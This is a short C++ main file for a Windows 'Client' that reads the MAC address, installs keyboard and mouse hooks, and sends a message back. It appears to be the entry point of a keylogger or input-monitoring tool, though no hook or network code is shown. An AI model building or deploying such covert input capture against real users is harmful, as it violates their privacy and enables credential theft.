#include <windows.h>
#include <iostream>
#include "Client.h"

Client clt;


int main(int ac, char **av)
{
	clt.getMACAddress();

	clt.setKeyboardHook();
	clt.setMouseHook();
	clt.sendBackMessage();
	return (0);
}